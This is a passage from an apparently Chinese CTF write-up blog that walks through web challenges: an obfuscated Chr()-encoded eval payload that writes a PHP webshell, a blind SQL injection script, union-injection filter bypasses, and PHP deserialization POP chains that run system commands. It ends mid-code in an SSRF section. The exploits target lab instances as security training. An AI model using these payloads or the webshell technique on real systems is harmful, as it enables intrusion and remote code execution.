GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(119).Chr(102).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(108).Chr(97).Chr(108).Chr(97).Chr(108).Chr(97).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))</span><br></pre></td></tr></table></figure><p>同样传给cookie，这里是创建了一个wf.php密码为lalalal，访问一下这个界面<br><img src="https://s1.ax1x.com/2022/11/19/zuyoZD.png" alt="zuyoZD.png"><br>没有报错说明写入成功，蚁剑连上终端cat就行<br><img src="https://s1.ax1x.com/2022/11/19/zucTCd.png" alt="zucTCd.png"></p><h2 id="Queen"><a href="#Queen" class="headerlink" title="Queen"></a>Queen</h2><p>这个题比赛时没弄出来，limit注入不太熟悉</p><p><img src="https://s1.ax1x.com/2022/11/19/zu2uTS.png" alt="zu2uTS.png"><br>需要伪造ip用X-Forwarded-For:127.0.0.1来伪造<br><img src="https://s1.ax1x.com/2022/11/19/zucbvt.png" alt="zucbvt.png"><br>但是跳转到302了并且登录失败，最后用limit找到注入点<br><img src="https://s1.ax1x.com/2022/11/19/zuc78A.png" alt="zuc78A.png"><br><img src="https://s1.ax1x.com/2022/11/19/zucI4H.png" alt="zucI4H.png"><br>盲注写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">  </span><br><span class="line">url = <span class="string">&#x27;http://d9960516-2ae7-4792-806e-90afce237a56.recruit.qsnctf.com:8080/login.php&#x27;</span>  </span><br><span class="line">headers = &#123;  </span><br><span class="line">    <span class="string">&quot;x-forwarded-for&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;or (ascii(substr((select(group_concat(Password))from(user)),&#123;&#125;,1))&gt;&#123;&#125;) limit 1#&#x27;&#x27;&#x27;</span>  </span><br><span class="line"><span class="comment">#or (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;) limit 1#  </span></span><br><span class="line"><span class="comment">#or (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;user&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;) limit 1#  </span></span><br><span class="line"><span class="comment">#or (ascii(substr((select(group_concat(Password))from(user)),&#123;&#125;,1))&gt;&#123;&#125;) limit 1#  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  </span><br><span class="line">    <span class="built_in">print</span>(i)  </span><br><span class="line">    left = <span class="number">32</span>  </span><br><span class="line">    right = <span class="number">127</span>  </span><br><span class="line">    mid = (left + right) // <span class="number">2</span>  </span><br><span class="line">    <span class="keyword">while</span> left &lt; right:  </span><br><span class="line">        payload_flag=payload.<span class="built_in">format</span>(i,mid)  </span><br><span class="line">        data = &#123;  </span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;password&quot;</span>: payload_flag  </span><br><span class="line">        &#125;  </span><br><span class="line">        r = requests.post(headers=headers, url=url, data=data, allow_redirects=<span class="literal">True</span>)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;登陆成功&quot;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            left = mid + <span class="number">1</span>  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            right = mid  </span><br><span class="line">        mid = (left + right) // <span class="number">2</span>  </span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">127</span> <span class="keyword">or</span> mid == <span class="number">32</span>:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    flag += <span class="built_in">chr</span>(right)  </span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2022/11/19/zu2cm6.png" alt="zu2cm6.png"></p><p>这个脚本有点问题，只有爆flag的payload有用，其它的不完整，后面复现再来改改</p><h2 id="Where"><a href="#Where" class="headerlink" title="Where"></a>Where</h2><p>直接扫目录有个admin，然后登录，看源码发现验证码是图片，那么应该不是进入后台了，在url上面发现base64加密的东西解码一下<br><img src="https://s1.ax1x.com/2022/11/19/zu2OAS.png" alt="zu2OAS.png"><br>在这个目录下但是它是不可访问的，于是试了一系列绕过结果不行，<br><img src="https://s1.ax1x.com/2022/11/19/zucLKP.png" alt="zucLKP.png"><br>看到这个目录有个eval函数可能有问题，果不其然(<a href="https://blog.csdn.net/weixin_43416469/article/details/114157361">PHPUnit远程代码执行漏洞 CVE-2017-9841 漏洞复现_ADummy_的博客-CSDN博客</a>)<br>这里木马是写不进去的，直接执行phpinfo然后搜索flag<br><img src="https://s1.ax1x.com/2022/11/19/zucHgI.png" alt="zucHgI.png"><br>提交是假flag离了个大谱，然后回去cat一下出来了<br><img src="https://s1.ax1x.com/2022/11/19/zucODf.png" alt="zucODf.png"></p><h2 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h2><p>一开始找了这个Weblogic的SSRF漏洞但是内网ip一直弄不出来，换思路发现好像不是这个洞<br>(<a href="https://blog.csdn.net/yumengzth/article/details/97522783">https://blog.csdn.net/yumengzth/article/details/97522783</a>)<br>参考这个，利用工具出来<br><img src="https://s1.ax1x.com/2022/11/19/zucxUg.png" alt="zucxUg.png"></p><p>很遗憾最终没能进入前30</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022SWPU未解题复现</title>
      <link href="/undefined/43696.html"/>
      <url>/undefined/43696.html</url>
      
        <content type="html"><![CDATA[<h2 id="Funny-web"><a href="#Funny-web" class="headerlink" title="Funny_web"></a>Funny_web</h2><p>这个题一开始就没做，不知道账号和密码算是他们内部题吧</p><p><img src="https://s1.ax1x.com/2022/11/08/xzm2WT.md.png" alt="xzm2WT.md.png"></p><p>然后进去之后看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])) &#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="string">&#x27;12345&#x27;</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) == <span class="string">&#x27;12345&#x27;</span>) &#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这为何相等又不相等&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我卡了一下一直在纠结<code>intval</code>这个函数，但是这里其实不是考这个函数而是考PHP弱比较<br>所以payload：<code>?num=12345a</code><br><img src="https://s1.ax1x.com/2022/11/08/xzmWSU.md.png" alt="xzmWSU.md.png"></p><h2 id="where-am-i"><a href="#where-am-i" class="headerlink" title="where_am_i"></a>where_am_i</h2><p>这个题那张图片实在是没看清那个酒店叫啥名字<br>山水间古迹酒店百度地图找到<br><img src="https://s1.ax1x.com/2022/11/08/xzmOSO.md.png" alt="xzmOSO.md.png"><br>输入客服电话去掉字符就行<br><img src="https://s1.ax1x.com/2022/11/08/xzmqfK.md.png" alt="xzmqfK.md.png"></p><h2 id="numgame"><a href="#numgame" class="headerlink" title="numgame"></a>numgame</h2><p>前面抓包发现1.js，然后有个NsScTf.php这些步骤先过当时不是卡在这里<br>进入NsScTf.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="comment">//hint: 与get相似的另一种请求协议是什么呢  </span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nss</span></span>&#123;  </span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">ctf</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;./hint2.php&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/n|c/m&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>], <span class="variable">$matches</span>))  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>卡在这里，一开始看那个hint以为是用HEAD请求但不是<br>利用<code>call_user_func</code>函数，直接看payload：<code>?p=Nss::Ctf</code>用大写绕过正则匹配模式是m所以可以用大写绕过主要是这里可以用<code>::</code>来进入ctf这个函数<br><img src="https://s1.ax1x.com/2022/11/08/xznkp8.md.png" alt="xznkp8.md.png"><br>提示nss2,同样的利用方法<br><img src="https://s1.ax1x.com/2022/11/08/xzniff.png" alt="xzniff.png"><br>flag在源码</p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>这个题当时没做出来一开始没找到绕过方式，后面没做了</p><p>用post传参 过滤了 <code>or 空格 union</code><br>爆表<br><code>nss=0&#39;ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()%23</code><br><img src="https://s1.ax1x.com/2022/11/08/xzn31U.png" alt="xzn31U.png"><br>爆列<br><code>nss=0&#39;ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_schema=database()%23</code><br><img src="https://s1.ax1x.com/2022/11/08/xznGX4.png" alt="xznGX4.png"><br>字段<br><code>nss=0&#39;ununionion/**/select/**/1,2,group_concat(Secr3t,flll444g)/**/from/**/NSS_tb%23</code><br><img src="https://s1.ax1x.com/2022/11/08/xzn8cF.png" alt="xzn8cF.png"></p><h2 id="ez-1zpop"><a href="#ez-1zpop" class="headerlink" title="ez_1zpop"></a>ez_1zpop</h2><p>这个pop链做的时候没看懂</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dxg</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span>;  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$impo</span>=<span class="string">&#x27;hi&#x27;</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">&#x27;weclome&#x27;</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">&#x27;to NSS&#x27;</span>;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;  </span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();  </span><br><span class="line">   &#125;  </span><br><span class="line">  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;impo) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md51) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md52) &amp;&amp; <span class="variable language_">$this</span>-&gt;md51 != <span class="variable language_">$this</span>-&gt;md52)  </span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span>;  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$a</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;https://www.ctfer.vip&#x27;</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$title</span>;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;      <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;      <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>])) &#123;   <span class="variable">$Data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>]);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;   <span class="title function_ invoke__">highlight_file</span>(__file__);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看fin类中的fmm()函数，<code>$b($this-&gt;title);</code>这一条语句如果b为system而title为ls &#x2F;,那么是不是就执行查看根目录，怎么进入这个函数呢？lt类中toString可以进入<code>return $this-&gt;impo-&gt;fmm();</code>那么怎么进入toString呢，当对象当作字符串输出时会进入toString方法，看__destruct()销毁对象时会输出这个对象，至此pop链就理清楚了，这里就进入toString有点难理解，其它还好，这个pop链是需要自己去构造危险函数的执行，以前没练过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$impo</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md51</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md52</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;impo = <span class="variable">$f</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;  </span><br><span class="line">        <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);<span class="comment">//这里做命令执行  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();  </span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="string">&quot;system&quot;</span>;  </span><br><span class="line"><span class="variable">$a</span>-&gt;title = <span class="string">&quot;ls /&quot;</span>;  </span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lt</span>(<span class="variable">$a</span>);<span class="comment">//通过构造函数让this-&gt;impo为对象销毁时进入toString  </span></span><br><span class="line"><span class="variable">$b</span>-&gt;md51[]=<span class="number">1</span>;<span class="comment">//通过数组绕过MD5  </span></span><br><span class="line"><span class="variable">$b</span>-&gt;md52[] = <span class="number">2</span>;  </span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><h2 id="1z-unserialize"><a href="#1z-unserialize" class="headerlink" title="1z_unserialize"></a>1z_unserialize</h2><p>之前没做过这种利用参数执行函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;NSSCTF.com&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span>;  </span><br><span class="line">       </span><br><span class="line">     <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">     </span>&#123;        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;lt;        <span class="variable">$a</span>(<span class="variable language_">$this</span>-&gt;lly);  </span><br><span class="line">     &#125;  </span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">&#125;  </span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nss&#x27;</span>]);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span>&#123;  </span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;NSSCTF.com&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span>;    </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lyh</span>();  </span><br><span class="line"><span class="variable">$a</span>-&gt;lt=<span class="string">&quot;assert&quot;</span>;  </span><br><span class="line"><span class="variable">$a</span>-&gt;lly=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2022/11/08/xznbHs.png" alt="xznbHs.png"></p><h2 id="js-sign"><a href="#js-sign" class="headerlink" title="js_sign"></a>js_sign</h2><p>查看源码<br><img src="https://s1.ax1x.com/2022/11/08/xzuVC6.png" alt="xzuVC6.png"><br>通过tapcode解码flag出来下面这串字符，不知道怎么提交了<br><img src="https://s1.ax1x.com/2022/11/08/xzuA4x.png" alt="xzuA4x.png"></p><h2 id="Power"><a href="#Power" class="headerlink" title="Power!"></a>Power!</h2><p>看源码有提示<br><img src="https://s1.ax1x.com/2022/11/08/xzuTG6.png" alt="xzuTG6.png"><br>全部的代码就不放了吧挺长的慢慢分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>];    <span class="comment">//flag in /flag.php</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$path</span>)&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http:|gopher:|glob:|php:/i&quot;</span>,<span class="variable">$path</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;Seriously??&lt;/h2&gt;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;cheems.jpg&quot;</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path_info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>];</span><br><span class="line">            <span class="variable">$FV</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path_info</span>));</span><br><span class="line">            <span class="variable">$FV</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;vergil.jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;POWER!!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>直接用get方法传入<code>image_path=flag.php</code><br><img src="https://s1.ax1x.com/2022/11/08/xzu7RK.png" alt="xzu7RK.png"><br><img src="https://s1.ax1x.com/2022/11/08/xzuHxO.png" alt="xzuHxO.png"><br>flag在内网，SSRF，看一下哪里能利用</p><figure class="highlight 